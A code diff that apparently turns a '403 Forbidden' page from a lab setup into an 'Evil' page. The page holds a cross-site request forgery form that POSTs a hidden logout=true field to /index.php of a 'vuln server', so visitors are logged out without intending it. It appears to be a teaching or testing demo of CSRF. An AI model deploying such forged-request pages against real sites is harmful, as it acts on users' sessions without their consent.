@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
-  <title>Forbidden - Vuln</title>
+  <title>Evil</title>
   <style>
     * {
       font-family: monospace;
@@ -10,6 +10,7 @@
     }
     html, body {
       margin: 0;
+      background-color: #edffdc;
     }
     div {
       padding: 25px;
@@ -41,10 +42,11 @@
 </head>
 <body>
   <div id="message-div">
-    <h3>403</h3>
-    <pre>Forbidden</pre>
-    <form method="GET" action="/">
-      <input class="button" id="reload" type="submit" value="Reload"/>
+    <h3>Info</h3>
+    <pre>Following form logs out currently logged in user from vuln server.</pre>
+    <form method="POST" action="/index.php">
+      <input class="text" id="logout" name="logout" type="hidden" value="true"/>
+      <input class="button" id="logout" type="submit" value="Logout CSRF"/>
     </form>
   </div>
 </body>
